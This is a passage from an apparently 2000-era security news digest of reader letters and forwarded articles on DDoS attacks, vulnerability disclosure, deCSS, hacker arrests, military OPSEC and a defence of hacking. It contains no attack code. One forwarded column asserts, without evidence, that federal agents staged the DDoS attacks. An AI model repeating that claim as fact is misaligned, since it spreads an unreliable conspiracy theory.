      line and actually used them.  They didn't take down the security sites to
      make them look bad.  They didn't go after the government.  They went after
      e-commerce, which I have to assume was designed for maximum reaction.
      
      I think we'll get some action now.

      Whatever CERT's motivations were, they had the effect of increasing user
      trust (because a new sheriff is in town) while decreasing trustability
      (because they sat on vulnerabilities users handed off to them).  This is
      backwards, in two places.
      
      I prefer the following approach: announce existence of vulnerability and
      promise a kiddy script in a month; wait a month for vendor to react;
      publish kiddy script.
      
        > Publishing vulnerabilities in critical systems that cannot be easily

        > traffic control system) is bad.
      
      Publishing is *very important* in these cases so the stakeholders know to
      reduce their trust in these systems.  If air traffic control is vulnerable,
      tell me so I can stop taking airplanes!
      
      A non-life-safety version of this problem was the publishing of a script
      that gave an existing process root privileges using the memory debugger
      abilities of the console monitor ("L1-A") of a Sun.  This debugger could be
      disabled, but nobody did because it disabled the software reset
      button.  This reported vulnerability allowed users to adjust their trust of
      the security of root sharply downward, corresponding more closely to the
      actual security of it in practice.

      This is gun control: "Don't punish murder, ban the gun instead!  Exploits
      are an evil instrumentality!  Exploits help a good boy go bad!"  The right
      answer is: Humans are held responsible for their behavior.  Guns, bricks,
      and exploits are just tools.
      
      
      From: Greg Guerin <glguerin@amug.org>
      Subject: publicity attack loops?
      
      I have to admit that I was chuckling all the way through the
      Fernandes/Cryptonym letter in the Feb 2000 Crypto-Gram.  Especially when at
      the end he wraps himself in the mantle of professional integrity.  I've
      already written two essays on the Fernandes discovery and his downloadable
      "repair" ZIP:
          <http://amug.org/~glguerin/opinion/win-nsa-key.html>
          <http://amug.org/~glguerin/opinion/crypto-repair-kit.html>
      
      Though neither one is about Fernandes's professional integrity, per se,
      they do make a number of points about specific practices.  To summarize the
      points (see the essays for the full explanation):
      
          1) the ZIP held 2 EXE's, 2 DLL's, and 1 source file.
          2) the downloadable ZIP had no digital signature.
          3) nothing within the ZIP had a separate digital signature.
          4) Fernandes's PGP key had no introducers at all.
          5) no pointers to others who could vouch for points 2-4.
          6) source was not compilable as supplied (missing header).
      
      Point 6 is only a little important because it means the EXE's must be
      trusted as given.  But there was only one source file anyway, so you're
      already trusting the other EXE completely.  And both DLL's must be trusted
      completely.  Risk-wise, 75% blind trust is virtually identical to 100%
      blind trust, so it's not all that useful a distinction.  It's like choosing
      whether to kill something 3 times over or 4 times -- correctly killing it
      once suffices.
      
      Note that at no point does "professional integrity" come into this, only
      "professional practice".  I'm not disputing INTENT (integrity), I'm only
      describing OUTCOME (practice).  Spotless integrity and intent cannot long
      survive avoidable errors in practice.  By observing practices an observer
      might infer skill, integrity, or both, or neither.  Those judgements, and
      the trustworthiness criteria underlying them, are left completely to the
      particular observer.  All I can say is what I would infer from my
      observations, and why.  You should draw your own conclusions, since my
      criteria for trustworthiness may differ from yours.  But you should also
      invest in understanding why you came to those conclusions -- flaws in the
      process can lead you astray.

      Subject: Distributed Denial-of-Service Attacks
      
      First of all, I'd like to congratulate you for your description and
      analysis of distributed denial-of-service (DDoS) attacks in the February
      issue of your Crypto-Gram newsletter.  I fully agree with most of your
      statements, including your pessimistic view that all existing approaches to
      address the problem are unsatisfactory in one way or another.
      
      In your article, however, you also argue that "in the long term,
      out-of-band signaling is the only way to deal with many of the
      vulnerabilities of the Internet, DDS attacks among them."  I don't agree
      with this statement.  Any out-of-band signaling channel can also be
      subjected to DoS and DDoS attacks.  I believe that the reason why telephone
      networks are not subjected to large-scale DoS and DDoS attacks is due to
      the fact that they address charging and billing, rather than their use of
      out-of-band signaling (out-of-band signaling has many advantages in other
      areas).  Trying to establish a huge quantity of connections in a telephone
      network is simply too expensive ... I think that the lesson learnt from
      telephone networks is that packet-based charging and billing -- combined
      with adequate security mechanisms -- may be a viable solution to protect
      against large-scale DoS and DDoS attacks on the Internet (rather than
      out-of-band signaling). However, packet-based charging and billing also has
      many disadvantages, including, for example, a huge administration
      overhead.  Consequently, I guess that packet-based charging and billing
      will not be applied on the Internet, and that "intelligent"
      packet-filtering performed by ISPs will be the major weapon to protect
      against large-scale DoS and DDoS attacks in the future.

      Subject: Defending Against DOS Attacks: Draining the Swamp
      
      If you'll pardon the musings of a biologist, I'd like to comment on your
      swamp analogy.  I know you never stated so but it bears pointing out that
      swamps are not "bad" in any defensible sense, nor is draining them "good,"
      even though doing so may have one immediate desirable consequence.  I am
      sure that in your own field you can think of many examples where a cure,
      though effective, may have been worse than the disease.  The RISK here is
      forgetting that in any complex system change comes at some cost; the more
      complex (or less well understood) the system, the harder it is to predict
      the cost.  I think this applies to the Internet.  It certainly applies to
      the natural world, in spades.  I will not bore you with examples.

      Subject: deCCS
      
      In the February 2000 Crypto-Gram, you wrote: "An important point is that
      DVDs can be copied and pirated without using deCSS or any other decryption,
      which certainly makes the original claim of 'prevents piracy' look either
      astoundingly ignorant or brazenly deceptive."
      
      There is a sense in which the "prevents piracy" claim makes sense.  deCSS
      makes it easy to copy the data on a DVD not just onto another DVD, but into
      another format, one which is easier to copy & transmit.  In that sense, one
      could characterize it as making piracy easier.  Kind of like the rationale
      behind the distinction between printed & electronic versions of source code
      in the original crypto export restrictions; but for a consumer data
      product, I think it's a more meaningful distinction.  I would have to
      characterize the court's ruling as a correct application of a bad law, in
      what may turn out to be a watershed case.

219.0 ISN:Mar 18th:Microsoft fends off hackers with Windows 2000
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      [Moderator: Ugh, this is a load. A "syn-flood" is designed to drive up CPU
       usage? Windows 2k fended this 'hacker' attack off?]
      
      Forwarded From: "Noonan, Michael D" <mdn@intel.com>
      
      (courtesy of Paul Thurrott's WinInfo - http://www.wininformant.com)
      
      Microsoft fends off hackers with Windows 2000
      
      In a controversial move sure to put the company square in the crosshairs
      of every hacker on the planet, Microsoft Corporation announced this week
      that it had successfully beaten off a "syn-flood" hacker attack Tuesday.
      As the Register's John Lettice notes, the company might have been better
      served by keeping the matter quiet. The attack, which is designed to bring
      a Web site to its knees by overloading processor capability, did little to
      slow down, let alone crash, the heavily clustered Microsoft Web site. The
      company says that it suffered only a 3-7% slowdown for a short period of
      time.
      
      "It was very minor, to be honest, so some people saw some slowdowns," said
      Microsoft spokesperson Adam Sohn. "We have a ton of overhead on this site.
      We can support terabytes and terabytes of downloads."
      
      The attack on Microsoft is the latest in a series of Web site attacks in
      recent weeks. Most of the previous attacks, which crippled Web sites such
      as Yahoo and eBay, were denial of service (DOS) attacks, which are
      designed to overload a Web server, making it incapable of serving actual
      users.  Investigators have yet to pinpoint the culprits in the previous
      attacks.  Microsoft says that it was able to determine where the attack on
      its Web site came from, however. The company alerted authorities and shut
      off their access to the company's Web site.
      
      Naturally, Microsoft credited Windows 2000 with saving the day.
      
      "The guys running the network swear to me that a year ago we would have
      been in big trouble, but with Windows 2000, nobody could knock our servers
      over,"  Sohn said. "Between the robustness of the OS and the security
      features built in, it really helped withstand the attack."
      
      Now doesn't that sound like a challenge?

220.0 ISN:Feds Behind Recent Massive Web Hacking/Fwd
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      2.23.00
      Feds Behind Recent Massive Web Hacking/Fwd
      
      
      During the unprecedented massive blitz of hack-attacks which brought some
      of the world's most active websites to an utter standstill in the second
      week of February through implementation of DDoS (distributed denial of
      service) tactics, NewsHawk made a basic "call" on the situation. To whit:
      we postulated that the hack-attacks, implemented on a scale and to an
      extent previously unheard-of, were most likely carried out by spooky
      cyber-goon squads in the employ of our beloved federal government.
      
      Since I am by no stretch of anyone's imagination what could even remotely
      be considered a computer geek or wirehead, nor am I particularly strong on
      researching issues which don't directly concern me, I made my call on the
      scene, solicited and published opinions from our mailing list on the
      situation and pretty much left it at that.
      
      Well, it turns out I wasn't the ONLY one who was more than a little bit
      suspicious that feds may have had more than a little bit to do with the
      hacking blitz.
      
      Indeed, MacAddict columnist Rich Pizor outdid us by a mile and actually
      researched the background of the whole situation: in particular with
      respect to certain proposals for an "Internet Gestapo" kind of deal known
      as the Federal Investigation and Detection Network, or FIDNet, which the
      Clinton gang had just recently been advancing as a means of "patrolling"
      cyberspace. The deafening chorus of either boos, hisses or just plain
      silence from all quarters which greeted the Clintonistas' Brave New
      World-style proposal caused a retreat of sorts, but according to Pizor's
      view, most likely only a temporary one. Indeed, one just long enough for
      these gangstas and goons to lick their wounds and come up with a PLAN
      which would make everyone fall slavishly in line with their malignant (as
      usual) machinations and devious schemes. Namely; the initiation of the
      overwhelming hack-attack tidal wave and blitzkrieg which devastated the
      Web a couple of weeks ago.
      
      It's an old Machiavellian game. Create a previously non-existent problem,
      and then let everyone cry and beg for you to provide a solution.
      
      Sheesh. And you thought WE get out a limb with these kooky conspiracy
      scenarios.
      
      But seriously, we think Pizor is in fact ONE HUNDRED PERCENT correct in
      his suppositions.
      
      And what's REALLY interesting to us at NewsHawk, considering what we've
      put up with lately in terms of "mysteriously" missing or diverted emails
      and related malicious harassment, is the notice tacked on the end of
      Pizor's article, (which we've reprinted in full below):  "We were unable
      to bring you this column at it's expected time and place in the Monday
      newsletter because our email server was having problems and our web site
      may have been under attack. COINCIDENCE?????"
      
      Uh... "coincidence? No f**king WAY! As Charlie Chan used to say: "too many
      coincidence, no longer a coincidence."
      
      Get the picture?

      Trigger Man
      by Rich Pizor
      
      mon feb.23
      
      A prevailing stereotype about the Internet is that it's full of
      crackpots hawking hair-brained conspiracy theories to anyone who will
      listen. Any responsible media outlet should consider it their job to
      present a solid, professional appearance in an attempt to countermand
      that stereotype. I'm therefore pleased to bring you a crackpot
      conspiracy theory of my own, which revealed itself to me when I
      connected the dots while reviewing the recent spate of Distributed
      Denial of Service (DDoS) attacks.
      
      Before we proceed any further, I must indulge in one act of contrition.
      I didn't want to go here. Really, I didn't. But companies and websites
      that no one's ever heard of are blaming every little outage or security
      flaw on the omni-present shadow of hackers, crackers, cyberterrorists
      and iSaboteurs. I feel then that it is my right -- nay, my solemn duty
      -- to correct the balance and proffer speculation (since that's all that
      any of this really is) as to what might have really happened. Our legal
      department also wants me to point out that neither myself,
      MacAddict.Com, or Imagine Media are necessarily making any formal
      allegations. That being said...
      
      In order to understand the elegance of what's going on here, we need to
      go back in time to the middle of last year. It all started with what the
      Clinton administration obviously assumed would be an innocuous and
      welcome announcement: Clinton had pushed forth a proposal for something
      called FIDNet, or the Federal Investigation and Detection Network. A
      controversial proposal to say the least, but the plan drew particular
      fire in late January as EPIC (among others) loudly denounced the plan,
      saying that it would lead to nothing more than an Orwellian information state.
      
      So Clinton (not uncharacteristically) backed down...just days before the
      first DDoS attack incapacitated Yahoo for a day, along with twelve other
      major sites over the course of the next week -- seven of which have come
      forth with reports. Suddenly everything became the fault of crackers. A
      man in Virginia was even inspired to launch his own DoS attack on the
      Virginia DMV website (he only used his own computer, so there was no
      Distributed nature to it).
      
      Certainly coincidental timing for a President who's trying to get an
      unreceptive public to go along with his draconian cybersecurity plan.
      Especially given Janet Reno's recent testimony before Congress regarding
      the need for formalized laws on Internet security, citing those very
      attacks as her justification.
      
      But it gets better. Two days after the first attack, the FBI held a
      press conference in which they vowed to catch the perpetrator(s) but
      also admitted that they didn't have any idea, at that time, who did it.
      "A 15-year-old kid could launch these attacks," said the Bureau's Ron
      Dick (with a name like that it's no wonder he wound up in the FBI). Only
      a few days later, the news bubbles out that they're hot on the trail of
      a suspect named "mafiaboy" -- surprise surprise, a 15-year-old kid,
      conveniently in Canada and out of the Feds' reach without cooperation
      from the Royal Canadian Mounted Police.
      
      Most in the hacking community scoff at the thought that "mafiaboy" could
      be involved in anything more than a copycat role. He's widely considered
      to be a "script kiddie" -- an amateur cracker seeking fame through his
      exploits using tools downloaded off the Internet. So it's puzzling that
      the Feds would want him that badly; the name "Lee Harvey Oswald" keeps
      coming to mind. It's also unclear why they want to find Mixter -- an
      anonymous German hacker who may have authored one or more of the tools
      that may have been involved -- when he has publicly stated that he
      didn't do it, and the tools he may have authored were never released
      publicly except with the intention of studying DDoS attacks and how to
      counter them. The only other lead that's been made public is an
      anonymous email sent to Attrition.org (a site that archives hacked Web
      pages) that even the site's webmaster isn't taking too seriously.
      
      Am I coming right out and saying that the government we elected is
      behind all of this? Not directly. I have a hard time seeing most elected
      officials even being able to use a word processor, let alone pull off
      something like this. But you have to admit, the timing of all of these
      events is mighty convenient -- and while it's unlikely that they could
      have done it themselves, all it takes is money and connections to
      arrange for someone to pull a trigger.
      
      It calls to mind Judd Hirsch's line from Independence Day: "Well you
      didn't *really* think they paid $500 for a hammer did you?"
      
      NOTE: We were unable to bring you this column at it's excepted time and
      place in the Monday newsletter because our email server was having
      problems and our web site may have been under attack. COINCIDENCE?????

      immortality in an Echelon log.

      FOOTNOTE: SAN DIEGO - A computer hacker known online as "The Gatsby" will
      spend 18 months in federal prison.
      
      A judge in San Diego has sentenced Jonathan Bosanac for electronically
      breaking into some of the country's largest computer systems.
      
      The judge said his wrongdoing caused more than $1 million in damage to one
      company alone.
      
      Bosanac was ordered to pay $10,000 in restitution to three telephone
      companies he hacked into.
      
      He pleaded guilty in December to participating in one of the nation's
      biggest hacking schemes.
      
      The crimes took place more than five years ago. Friends say the man's life
      has since turned around. He's been working as a computer consultant.

222.0 ISN:Naval officer in hot water over policy
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Forwarded From: William Knowles <wk@c4i.org>
      
      http://www.defensenews.com/dtemp/gomez.html
      
      WASHINGTON - A U.S. Navy petty officer who engaged in a recent Internet
      discussion of network security issues has inadvertently sparked a major
      controversy regarding military operations security, and whether Pentagon
      policy has kept up with the Information Age.
      
      Operations security (OPSEC) is closely related to information operations.
      Its primary goal is to "force the adversary commander to make faulty
      decisions based upon insufficient information and/or to delay the decision
      making process due to a lack of information,"  according to the Pentagon's
      joint doctrine written in 1997.
      
      During the height of the Cold War, military members were warned not to
      discuss such seemingly harmless things as unit morale, readiness or
      upcoming training missions because bits of information can be pieced
      together to learn a great deal about military operations.
      
      The Pentagon in October ordered that all military Internet sites be
      scrubbed of personal or sensitive tactical information.
      
      Now the Navy is investigating actions taken by Gene Gomez, a petty officer
      second class aboard the USS Essex - actions some experts say may provide
      potential adversaries with sensitive technical information that could
      allow them to infiltrate military networks, or make Gomez and his family
      vulnerable to terrorist activity.
      
      While he is under investigation, the former network administrator has been
      denied access to the ship's networks, has had his shipboard electronic
      mail capabilities disabled, and had his separation of service papers
      placed on hold.
      
      Gomez refused to comment on the situation.
      
      "I want to ensure that I don't get into any more trouble," Gomez told
      Defense News.
      
      On Dec. 18, Gomez engaged in a discussion on an electronic mailing list
      organized by the computer security Internet site AntiOnline. The topic of
      the discussion was how to bypass some particular network security
      measures. In addition, he used his official electronic mailing address
      aboard the Essex, and signed his full name and rank.
      
      The e-mail caught the attention of Rick Forno, co-author of the book, "The
      Art of Information Warfare." Forno wrote and published on the Internet an
      article, "The Need for Common Sense, Not Only Technical Competence,"
      blasting Gomez's actions.
      
      "Several aspects of [Gomez's] electronic mail messages are frightening,
      and should serve as a wake-up call to the military leadership regarding
      their perceived levels of OPSEC awareness throughout the military," Forno
      wrote.
      
      Forno conducted an Internet search on Gomez's name and found that earlier
      he had written to Happy Hacker Digest and to a group of so-called white
      hat hackers, the network security organization known as L0pht Heavy
      Industries.
      
      In these two separate messages, Gomez was seeking advice on how to disable
      some network functions he felt could be used to gain unauthorized access.
      
      Forno also found Gomez's personal Internet home page; a wealth of personal
      information; and information about the systems the sailor works with,
      including the Joint Maritime Command Information System, a strategic level
      command and control system.
      
      The article ignited a controversy, and led to a minor cyber war of words
      between Forno and Gomez and their respective supporters.
      
      The Pentagon effort to scrub Internet sites of such information did not
      address the issue of military members disclosing the same kind of
      information on non-military Internet sites.
      
      And Gomez is not the only military member using non-military Internet
      sites to disclose information that may not be allowed on military sites.
      Lt. Cmdr. Sheila Scarborough, executive officer aboard the USS Fort
      McHenry, for example, maintains a personal Internet site that offers
      details about her family, life aboard ship, and the ship's operations.
      
      Scarborough did not respond to Defense News questions mailed
      electronically.
      
      In addition, the Navy continues to provide daily Internet updates on the
      number of personnel on duty, the number of operational aircraft and ships,
      and the deployment status of the Fifth, Sixth and Seventh fleets. As of
      Jan. 3, the Navy listed 14 ships, 95 aircraft and 7,969 sailors and
      marines in the Persian Gulf.
      
      In an interview with Defense News, Forno downplayed the actual damage
      Gomez might have done to OPSEC, but said the situation "is indicative of
      the lack of online security awareness within the Department of Defense."
      
      In the aftermath of Gomez's alleged security violations, Forno and others
      now are calling for the Pentagon to take further steps to establish what
      should not be revealed by military members on non-military Web sites.
      
      "The Pentagon has not kept up with the Internet, despite being its parent.
      And yes, the Internet should be subject to OPSEC regulations, just as
      phones, radios, and message traffic is," said Ed Markin, a retired Navy
      pilot."Odds are the vast majority of senior military officers have no
      concept of what all transpires on the Internet."
      
      Susan Hansen, Pentagon spokeswoman, countered that the Pentagon already
      has taken steps to caution military members on use of the Web.
      
      "The current [OPSEC] directive was updated and signed out by Deputy
      Secretary John Hamre on Nov. 29. It does include a specific reference to
      the World Wide Web by stating that 'the Department of Defense maintains
      heightened awareness of potential threats of adversaries taking advantage
      of publicly available information and other detectable unclassified
      activities to derive indicators of U.S.  intentions, capabilities,
      operations and activities'," Hansen said.
      
      The Navy's public affairs office did not respond by press time to a
      request for comment.

223.0  ISN:Police to step up fight against e-crime
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        Police to step up fight against e-crime

        Source: AAP | Published: Friday March 17, 3:38 PM 

        Police are set to recruit computer boffins in a bid to boost the fight 
        against so-called e-crime.

        The potential to commit crimes using computers and other information 
        technology was one of the greatest problems ever to face law 
        enforcement, Australian Federal Police Commissioner Mick Palmer said 
        today.

        Speaking at the end of a week-long conference of police commissioners 
        from Australia, New Zealand, Fiji and Papua New Guinea, Commissioner 
        Palmer said a staggering 900 million people would be using the Internet 
        by the end of this year.

        'People who abuse these technologies have the capacity to commit 
        offences on a global basis, with complete anonymity, with speed and on a 
        scale not previously encountered,' Commissioner Palmer told journalists.

        Credit card fraud, electronic vandalism, terrorism, electronic money 
        laundering and tax evasion are some examples of electronic crime.

        'The capacity of properly organised, electronic based crime to undermine 
        the financial stability of small and medium sized countries is very 
        real,' Commissioner Palmer said.

        A major problem for police is how to attract personnel with enough 
        technical expertise to fight this new crime.

        Commissioner Palmer said already police recruitment and selection was 
        becoming more flexible.

        'Clearly some of the technical skills that we are going to need ... come 
        at a very high cost,' he said.

        'People ... in that industry are earning a lot of money and that makes 
        the partnerships with business and the wider business community very 
        important.'

        Police will be looking to exchange staff with private industry to gain 
        the skills necessary, probably on short term, project based 
        arrangements.

        Commissioner Palmer said discussions and negotiations had already begun 
        on this issue and Commonwealth Bank CEO David Murray addressed the 
        commissioners.

        'We will be recruiting people from the coalface for short periods of 
        time, we are going to be sharing resources between ourselves and the 
        wider partnership both in the private and public sense.'

        The commissioners agreed to establish an Electronic Crime Steering 
        Committee to evaluate Australasia's capacity to fight electronic crime.

        It will develop an Australasian Law Enforcement Electronic Crime 
        Strategy by the end of June.

224.0 ISN:Developers blasted on security
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Forwarded From: William Knowles <wk@c4i.org>
      
      http://www.wired.com/news/politics/0,1283,34865,00.html
      
      WASHINGTON -- A top cyber security expert blasted software developers
      Thursday for marketing flawed products that he said boosted the Internet's
      vulnerability to hacker attacks.
      
      "There is little evidence of improvement in the security features of most
      products," said Rich Pethia, director of a federally funded computer
      emergency response operation at Carnegie Mellon University in Pittsburgh.
      
      "Developers are not devoting sufficient effort to apply lessons learned
      about the sources of vulnerabilities."
      
      Pethia made his comments to a congressional panel looking into the
      so-called denial-of-service attacks that disrupted access to popular Web
      sites last month for a few hours at a time.
      
      He said his organization, which responded to more than 8,000 computer
      security incidents last year, up from 132 in its first full year of
      operation 10 years ago, had found the same types of security defects in
      newer versions of products as in earlier ones.
      
      "Technology evolves so rapidly that vendors concentrate on time to market,
      often minimizing that time by placing a low priority on security
      features," he said in a statement to a subcommittee of the House Committee
      on Government Reform.
      
      The alleged lack of urgency in plugging such cracks is unlikely to change
      until customers demand that products that are more secure, Pethia said.
      Pethia did not criticize any companies by name in his prepared statement
      to the panel.

225.0 ISN:"Islands in the clickstream, in defense of hacking"
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From: richard@thiemeworks.com
      
      
      The following article was published in the Village Voice, February 16 - 22, 2000
      and the LA Weekly under the title "Hacking the Future."
      
      Islands in the Clickstream:
      In Defense of Hacking
      
      
      Let's get our definitions straight. Last week's attacks on dozens of Web
      sites were not the work of hackers. They were the work of script kiddies,
      and the difference is everything. Script kiddies download ready-made tools
      and use them to damage the network. Script kiddies criminally distort the
      essential ethos of hacking, which is to pass through the network without a
      trace. Hackers read the unknown, sense the contours of the codes that make
      tomorrow's booms and busts.
      
      It's no wonder that last week hackers everywhere cringed when the media
      confused them with script kiddies. Not less than 10 years ago, the word
      hacker conjured a dedicated geek, hunched over a glowing terminal, working
      late into the night to solve an intractable dilemma. Now hacker means
      something akin to cybercriminal. The semantic shift is regrettable, not
      only because the distortion inhibits clarity, but because it buries a
      piece of history we'd be wise to keep fresh: It was hackers who cobbled
      together the Internet.
      
      Hacking is a quest for knowledge. You can see the essence of the activity
      in meetings at security firms like Secure Computing, where hackers are a
      key part of the professional services team. With clients in the Fortune
      500 and three-letter government agencies, like DOD and NSA, the stakes are
      high, and when the firm faces a perplexing problem, brainstorming sessions
      go late into the night. Ideas fly from one person to another like pinballs
      off flippers, as the group mind turns over and examines the puzzle from
      all sides.
      
      The concept of a "group mind" flows from the structure of the Internet
      itself, parallel processor harnessed to parallel processor to achieve a
      single goal. It's no coincidence that information technology professionals
      often think in a style similar to the way computers calculate. The network
      taught them how to reason digitally; it imprinted itself on their minds
      just as they imprinted their minds on it.
      
      Is it any wonder, then, that hackers are the leaders of the new
      millennium? By leader I mean someone who forges ahead and names the
      emergent realities of the dim future. Consider Tim Berners-Lee, who
      designed the first Web protocols and wrote the first browser code.
      Berners-Lee was a hacker. Or consider Richard Stallman, the evangelist of
      Open Source software. Stallman is an extraordinary hacker.
      
      I recently consulted with a major mutual fund, and after the meeting I
      traded war stories with its head of IT. He fondly recalled the old days of
      hacking Unix systems. That this former "delinquent" now runs a system
      executing billion-dollar transactions is not shocking. Most of the bright
      people in the IT business learned how to hack by-what else?-hacking.
      
      Let's go back to Open Source for a moment. It's now the conventional
      wisdom that the Linux operating system and GNU Project are miracles of
      modern computing, which may one day triumph over the clunky software
      produced by the Microsoft-Apple cartel. Stallman launched the GNU Project
      by asking hackers to volunteer their services. Of course, they did.
      Likewise, Linux was founded on the belief that complex systems must be
      open, evolving, and free in order to reach their ull potential. In other
      words, they must be hackable and they must be hacked. Continuously.
      
      Now comes the FBI and President Clinton with criminal sanctions for these
      script kiddies. It's right and just to keep the peace, but let's remember
      that in the Internet's embryonic stage, hacking, far from being criminal,
      was encouraged.  When computers were first networked through telephone
      lines and slow modems, bulletin boards emerged as crossroads where
      cybertravelers could leave messages and valuable information about how the
      phone lines intersected with microprocessors. By these postings, the
      network formed a symbiotic relationship with its users, and through the
      give and take of countless exchanges between hackers, the network
      bootstrapped itself to a higher level of complexity. As Tom Jackiewicz,
      who helps administer upt.org, an outgrowth of the hackers' favorite, the
      UPT Bulletin Board, recalls, "In the old days of a decade ago, no kid
      could afford a Solaris workstation. The only machines available were
      online. You could learn only by roaming the network."
      
      Today the stakes are higher, security tighter, but the basic modalities of
      hacking and its relationship to innovation remain. The challenge du jour
      is the gauntlet thrown down by Microsoft, which claims that Windows NT,
      the operating system of many businesses, is secure. What a claim! For a
      baseball fan it would be like hearing the Yankees brag that they could
      play an entire season without losing a single game. Hackers love to find
      flaws in Windows NT. For them, the payoff is the power rush of the thunk!
      when the stone hits Goliath in the forehead.
      
      One of the sharpest stones to leave a hacker's sling is a program called
      Back Orifice 2000. Developed by a group called Cult of the Dead Cow, the
      program can be loaded stealthily on a Windows network, giving a remote
      user control over the network. Why develop such a weapon? In the current
      environment of ubiquitous distributed computing-that is, networks and
      nodes everywhere-the hackers argue that no operating system protects
      against stealthy executables like Back Orifice. So the program is a form
      of shock therapy. It jerks Microsoft into action, stirring an indolent
      industry into making the Internet more secure. The upgrades that come as a
      result benefit every Windows user.
      
      As a culture we are just beginning to recognize this dynamic. One of the
      first hacker groups to benefit from our grudging acceptance of the craft
      is LOpht, which crossed over from the computing underground to the
      mainstream after finding flaws in Windows NT. Their transition has been so
      successful that when Congress conducted an investigation into Internet
      security it asked two LOpht members, Mudge and Weld Pond, to come to
      Washington for a briefing. Now LOpht has teamed up with former Compaq
      Computer executives to form @Stake, a security firm that has the media and
      Wall Street swooning.
      
      So when is a hacker not a felon? When he receives $10 million in venture
      capital? When Congress invites him to a hearing?
      
      When we lump all hackers into a criminal class we are liable to forget
      their essential role as architects of the information age. Edward O.
      Wilson said that scientists are characterized by a passion for knowledge,
      obsession, and daring. Hackers share that passion, the hunter-gatherer
      gene for restless wandering, wondering what's beyond the next hill. They
      hack because it's fun, because it's a challenge, and because the activity
      shapes their identity. Their strengths-love of risk, toleration of
      ambiguity, and ability to sift meaning from disparate sources-power the
      very network we all rush to join.

226.0 ISN:Man angry at employer swallows own head.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      http://www.sjmercury.com/breaking/docs/073358.htm
      
      NEW YORK (AP) [03.15.2000] - A database engineer angry at his employer
      was arrested on charges of using codes to disable computers in a
      three-day cyber attack on the company, authorities said Wednesday.
      
      Abdelkader Smires, 31, was arrested Tuesday and charged with
      intentionally causing damage through the unauthorized use of a
      computer.
      
      Computers at Internet Trading Technologies crashed for several hours
      over the three-day period beginning March 9. The attacks were traced
      to a computer at Queens College and authorities determined that
      Smires, who had once taught computer science there, had been using
      that computer, according to a criminal complaint.
      
      The company processes trades electronically for members of the
      National Association of Securities Dealers.
      
      The alleged attacks began after Smires and another engineer -- who was
      not named -- refused to help consultants and other workers learn the
      company's new operating system without more money, job security and
      equity, authorities said.
      
      On March 8, the company offered Smires a $70,000 raise, $50,000 in
      stock options and a one-year contract, but Smires turned them down,
      authorities said.
      
      The charge is punishable by up to five years in prison. Smires was in
      jail without bail pending a hearing Friday in federal court. He was to
      be assigned a public defender. Calls to the public defender's office
      were not immediately returned Wednesday.

      By Robert MacMillan, Newsbytes
      WASHINGTON, DC, U.S.A.,
      15 Mar 2000, 1:15 PM CST
      
      From Antonio Carlos Jobim to the samba, the US generally has welcomed
      some of the cooler cultural exports from Brazil, but the latest one -
      a series of hack attacks on NASA's Jet Propulsion Laboratory at
      CalTech - has the agency bossa nova-ing its way toward beefing up its
      security measures.
      
      JPL Spokesman Frank O'Donnell confirmed for Newsbytes an MSNBC report
      that the agency has shut down access to queries emanating from Brazil
      until the agency's security team makes some necessary improvements to
      its network.
      
      O'Donnell said that the Brazil shutout was not a "blacklist" attempt,
      as earlier reports indicated.
      
      "There was a number of recent attacks on JPL hosts originating from
      various sites in Brazil, and as a temporary move while our computer
      security people work, we're blocking network access to JPL from
      Brazil," O'Donnell said. "But this is a temporary thing."
      
      He said normal service to South America's largest nation would return
      "in a matter of days at most."
      
      He added that he is "not aware of any (security) compromises per se in
      these attacks."
      
      Highly secure data at JPL generally is not stored on hosts that are
      connected to the Internet, O'Donnell also said, but added that he
      could "not go into a great deal of detail" on what kind of information
      was sought.
      
      MSNBC reported the Brazil problem after a network analyst at the Bank
      of Brazil in Brasilia reported that he could not access the JPL site.
      
      The service also reported that a CERT official at its headquarters in
      Pittsburgh, Pa., said that blocking access to an entire network or
      country is reasonably common, though the official said that spoofing
      attacks - when the address of the attacking e-mail in a denial of
      service attack is falsified - blocking against a particular domain or
      country code becomes largely ineffective.
      
      O'Donnell said that CERT and the JPL have been working jointly on
      security issues.

      Special to washingtonpost.com

      The Navy's announcement that it is arming 2,000 ship-based officers
      with Palm V computers would seem, at first glance, to be a sound
      business decision, and proof that the Pentagon can indeed buy "off the
      shelf" products to the benefit of the taxpayer.
      
      The purchase is touted as the largest government buy ever of hand-held
      devices. But is it an investment in productivity, or a faddish move
      that has no place in the military arena?
      
      "It's one of the neatest things I've ever seen," Lt. Jeff Keenan told
      the Associated Press. Keenan is a combat systems officer aboard the
      Norfolk-based destroyer USS Laboon. "I used to be one of those people
      who carried around a big date book all the time, and I'd misplace it
      plenty of times, particularly when you'd put it down to climb a
      ladder," Keenan said.
      
      Don't burn your notebook just yet Jeff.
      
      Though his Palm V packs the equivalent of message center,
      walkie-talkie and clipboard, you can't get it wet.
      
      Plug and Play
      
      Laptop computers, pagers, and hand-held devices are sprouting like
      weeds in the military. While many are truly purchases direct from
      civilian vendors, others are made to order for the wear and tear of
      the battlefield: waterproof, mud-proof, shock-resistant, anti-glare,
      and electromagnetic pulse surviving.
      
      These computers--Mini-Python, the M-30, Condor, FALCon, and Warlord
      Notebook--could almost be weapons given their ingenious names. Better
      able to survive the rigors of combat, they are much more expensive
      than both the Palm V or any high-end commercial laptop.
      
      "A Palm Pilot is five ounces of dead weight in a firefight," says one
      military technology expert. For the battlefield, the Army's Force XXI
      experiment is testing dozens of laptops and helmet and body-mounted
      computers (called "appliques") to link soldiers, officers, and
      equipment.
      
      The Navy is not without its own sea-going technology. One company has
      produced a $30,000 laptop approved for use on the decks of ships
      because it can sustain sea spray, intense sunlight and the extreme
      electromagnetic interference from shipboard radar.
      
      Is this indeed "a battlefield bristling with leap-ahead technology,"
      as former Secretary of Defense William Perry described the Army's
      digitization effort a few years back? Or is it the cyber equivalent of
      the $600 toilet seat?
      
      Solutions and Problems
      
      "Adolescence," is how Martin Libicki, an information technology expert
